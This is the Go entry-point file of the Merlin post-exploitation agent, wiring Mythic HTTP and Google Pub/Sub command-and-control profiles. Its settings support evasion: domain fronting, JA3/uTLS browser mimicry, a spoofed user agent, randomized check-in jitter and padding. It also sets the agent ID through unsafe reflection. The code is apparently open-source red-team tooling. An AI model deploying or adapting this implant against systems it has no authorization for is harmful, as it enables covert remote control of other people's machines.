/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package main

import (
	// Standard
	"encoding/json"
	"fmt"
	"os"
	"reflect"
	"strconv"
	"strings"
	"unsafe"

	// 3rd Party
	"github.com/fatih/color"
	"github.com/google/uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin-agent/v2/agent"
	"github.com/Ne0nd0g/merlin-agent/v2/clients"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/mythic"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	"github.com/Ne0nd0g/merlin-agent/v2/run"
)

// TODO Update pkg/agent/core.[build, verbose, debug]

// GLOBAL VARIABLES

// auth the authentication method the Agent will use to authenticate to the server
var auth = "rsa"

// debug a boolean value that determines if the Agent will print debug output
var debug = "false"

// headers is a list of HTTP headers that the agent will use with the HTTP protocol to communicate with the server
var headers = ""

// host a specific HTTP header used with HTTP communications; notably used for domain fronting
var host string

// httpClient is a string that represents what type of HTTP client the Agent should use (e.g., winhttp, go)
var httpClient = "go"

// ja3 a string that represents how the Agent should configure it TLS client
var ja3 string

// killdate the date and time that the agent will quit running
var killdate = "0"

// maxretry the number of failed connections to the server before the agent will quit running
var maxretry = "7"

// padding the maximum size for random amounts of data appended to all messages to prevent static message sizes
var padding = "4096"

// parrot a string from the https://github.com/refraction-networking/utls#parroting library to mimic a specific browser
var parrot string

// payloadID is the ID Mythic uses to track the payload
var payloadID = ""

// profile is the Mythic C2 profile the Agent will use to communicate with the server
var profile = ""

// proxy the address of HTTP proxy to send HTTP traffic through
var proxy string

// psk is the Pre-Shared Key, the secret used to encrypt messages communications with the server
var psk string

// secure a boolean value as a string that determines the value of the TLS InsecureSkipVerify option for HTTP
// communications.
var secure = "false"

// skew the maximum size for random amounts of time to add to the sleep value to vary checkin times
var skew = "3000"

// sleep the amount of time the agent will sleep before it attempts to check in with the server
var sleep = "30s"

// transforms is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
// that will be sent to the server
var transforms = "mythic,aes"

// url the protocol, address, and port of the Agent's command and control server to communicate with
var url = "https://127.0.0.1:443"

// useragent the HTTP User-Agent header for HTTP communications
var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"

// verbose a boolean value that determines if the Agent will print verbose output
var verbose = "false"

// PubSub-specific variables
var projectID = ""
var resultsTopic = ""
var tasksSubscription = ""
var credentialsJSON = ""
var encryptionMode = ""

func setAgentID(a interface{}, newID uuid.UUID) error {
	v := reflect.ValueOf(a).Elem()
	t := v.Type()

	var idField reflect.Value
	var fieldIndex int = -1

	for i := 0; i < v.NumField(); i++ {
		fieldType := t.Field(i).Type.String()
		if strings.Contains(fieldType, "UUID") {
			idField = v.Field(i)
			fieldIndex = i
			if core.Verbose {
				color.Green(fmt.Sprintf("[+] Found UUID field at index %d: %s (type: %s)", i, t.Field(i).Name, fieldType))
			}
			break
		}
	}

	if fieldIndex == -1 {
		if core.Verbose {
			color.Yellow("[DEBUG] UUID field not found. Available fields:")
			for i := 0; i < v.NumField(); i++ {
				color.Yellow(fmt.Sprintf("  - %s (type: %s)", t.Field(i).Name, t.Field(i).Type))
			}
		}
		return fmt.Errorf("UUID field not found in agent struct")
	}

	idField = reflect.NewAt(idField.Type(), unsafe.Pointer(idField.UnsafeAddr())).Elem()
	idField.Set(reflect.ValueOf(newID))

	if core.Verbose {
		color.Cyan(fmt.Sprintf("[*] Agent UUID successfully set to payloadID: %s", newID.String()))
	}

	return nil
}

func main() {
	core.Verbose, _ = strconv.ParseBool(verbose)
	core.Debug, _ = strconv.ParseBool(debug)

	// Setup and run agent
	agentConfig := agent.Config{
		Sleep:    sleep,
		Skew:     skew,
		KillDate: killdate,
		MaxRetry: maxretry,
	}

	a, err := agent.New(agentConfig)
	if err != nil {
		if core.Verbose {
			color.Red(err.Error())
		}
		os.Exit(1)
	}

	// Parse the secure flag
	var verify bool
	verify, err = strconv.ParseBool(secure)
	if err != nil {
		if core.Verbose {
			color.Red(err.Error())
		}
		os.Exit(1)
	}

	var client clients.Client
	switch profile {
	case "http":
		// Mythic HTTP C2 profile client configuration
		clientConfig := mythic.Config{
			AgentID:      a.ID(),
			AuthPackage:  auth,
			PayloadID:    payloadID,
			URL:          url,
			PSK:          psk,
			UserAgent:    useragent,
			JA3:          ja3,
			Parrot:       parrot,
			Host:         host,
			Headers:      headers,
			Proxy:        proxy,
			Padding:      padding,
			InsecureTLS:  !verify,
			Transformers: transforms,
			ClientType:   httpClient,
		}

		// Parse http or https
		if strings.HasPrefix(url, "https://") {
			clientConfig.Protocol = "https"
		} else if strings.HasPrefix(url, "http://") {
			clientConfig.Protocol = "http"
		} else {
			if core.Verbose {
				color.Red("unable to detect valid protocol from URL: " + url)
				os.Exit(1)
			}
		}

		// Get the client
		client, err = mythic.New(clientConfig)
		if err != nil {
			if core.Verbose {
				color.Red(err.Error())
			}
			os.Exit(1)
		}
	case "pubsub":
		maxretry = "500"
		var cfg Config

		if projectID != "" && resultsTopic != "" && tasksSubscription != "" {
			cfg = Config{
				ProjectID:         projectID,
				ResultsTopic:      resultsTopic,
				TasksSubscription: tasksSubscription,
				CredentialsFile:   credentialsJSON,
			}
			if core.Verbose {
				color.Cyan("[Merlin] [main.go] Using build-time configuration (Mythic build)")
			}
		}

		if payloadID != "" {
			payloadUUID, err := uuid.Parse(payloadID)
			if err != nil {
				if core.Verbose {
					color.Red(fmt.Sprintf("[Merlin] [main.go] failed to parse payloadID: %s", err.Error()))
				}
				os.Exit(1)
			}

			err = setAgentID(&a, payloadUUID)
			if err != nil {
				if core.Verbose {
					color.Red(fmt.Sprintf("[Merlin] [main.go] failed to set agent ID: %s", err.Error()))
				}
				os.Exit(1)
			}

			if core.Verbose {
				color.Cyan(fmt.Sprintf("[Merlin] [main.go] Agent UUID set to payloadID: %s", payloadID))
			}
		}

		client, err = NewPubSubClient(&cfg, payloadID, psk, encryptionMode)
		if err != nil {
			if core.Verbose {
				color.Red(fmt.Sprintf("[Merlin] [main.go] failed to create pubsub client: %s", err.Error()))
			}
			os.Exit(1)
		}

		if core.Verbose {
			color.Green("[Merlin] [main.go] PubSub client initialized successfully")
		}
	default:
		if core.Verbose {
			color.Red(fmt.Sprintf("unknown C2 profile: %s", profile))
		}
		os.Exit(1)
	}

	// Start the agent
	run.Run(a, client)
}
